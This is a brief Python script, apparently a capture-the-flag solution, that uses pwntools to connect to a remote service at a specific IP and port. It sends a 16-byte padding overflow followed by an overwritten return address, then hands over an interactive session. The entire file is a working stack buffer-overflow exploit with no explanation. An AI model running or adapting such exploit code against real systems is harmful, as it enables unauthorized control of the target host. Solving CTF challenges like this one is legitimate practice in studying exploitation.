from pwn import *

proc = remote("109.233.56.90", 11605)
input()
proc.send(b"A"*(8 + 8)+p64(0x00401162))
proc.interactive()
